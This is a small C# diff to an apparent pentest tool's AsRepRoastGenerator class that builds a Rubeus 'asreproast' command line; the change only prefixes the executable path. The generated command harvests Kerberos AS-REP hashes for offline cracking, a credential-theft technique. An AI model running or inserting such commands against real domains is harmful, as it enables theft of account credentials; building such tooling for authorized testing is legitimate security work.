@@ -78,7 +78,7 @@ public static class AsRepRoastGenerator
         }
         lines.Add("");
 
-        string command = $"Rubeus.exe asreproast /format:{outputFormat.ToLowerInvariant()} /outfile:asrep.txt /nowrap";
+        string command = $".\\Rubeus.exe asreproast /format:{outputFormat.ToLowerInvariant()} /outfile:asrep.txt /nowrap";
         if (identity.Length > 0)
         {
             command += $" /user:{identity}";
